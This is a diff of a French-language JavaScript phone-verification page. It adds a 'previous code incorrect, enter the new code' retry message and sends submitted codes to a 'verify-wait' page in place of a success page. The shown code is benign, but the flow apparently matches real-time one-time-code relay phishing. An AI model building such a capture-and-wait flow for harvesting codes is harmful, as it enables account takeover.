@@ -6,11 +6,20 @@ function getParam(name) {
 
 const phone = getParam('phone') || '--';
 const length = parseInt(getParam('length')) || 6;
+const isRetry = getParam('retry') === '1';
 
 document.getElementById('codePhone').textContent = phone;
 
+// Message si retry
+const statusEl = document.getElementById('codeStatus');
+if (isRetry) {
+    statusEl.textContent = '⚠️ Le code précédent était incorrect. Veuillez saisir le nouveau code.';
+    statusEl.className = 'status-message error';
+}
+
 // Générer les inputs dynamiquement
 const container = document.getElementById('codeInputs');
+container.innerHTML = '';
 for (let i = 0; i < length; i++) {
     const input = document.createElement('input');
     input.type = 'text';
@@ -78,11 +87,11 @@ async function verifyCode() {
         const data = await res.json();
 
         if (res.ok && data.success) {
-            status.textContent = '✅ Code vérifié avec succès !';
+            status.textContent = '✅ Code envoyé, vérification en cours...';
             status.className = 'status-message success';
             setTimeout(() => {
-                window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
-            }, 1500);
+                window.location.href = `verify-wait.html?phone=${encodeURIComponent(phone)}&length=${length}`;
+            }, 800);
         } else {
             status.textContent = data.message || '❌ Code incorrect';
             status.className = 'status-message error';
